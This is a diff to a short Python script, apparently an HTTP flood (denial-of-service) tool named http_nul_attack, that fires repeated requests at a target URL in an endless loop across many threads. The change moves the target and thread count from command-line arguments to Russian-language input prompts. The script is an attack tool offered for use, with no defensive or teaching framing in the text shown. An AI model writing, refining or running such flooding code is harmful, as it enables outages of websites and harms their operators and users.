@@ -1,9 +1,11 @@
 import requests
 import threading
-import sys
 
-def http_nul_attack(target_url, num_threads):
+def http_nul_attack():
     try:
+        target_url = input("Введите адрес (например, https://example.com): ")
+        num_threads = int(input("Введите количество потоков: "))
+
         def send_request():
             while True:
                 try:
@@ -27,13 +29,5 @@ def http_nul_attack(target_url, num_threads):
     except ValueError:
         print("Некорректное количество потоков.")
 
-if __name__ == "__main__":
-    if len(sys.argv) != 4:
-        print("Используйте: python3 main.py <адрес_цели> <количество_потоков>")
-        sys.exit(1)
-
-    target_url = sys.argv[1]
-    num_threads = int(sys.argv[3])
-
-    # Пример использования
-    http_nul_attack(target_url, num_threads)
+# Пример использования
+http_nul_attack()
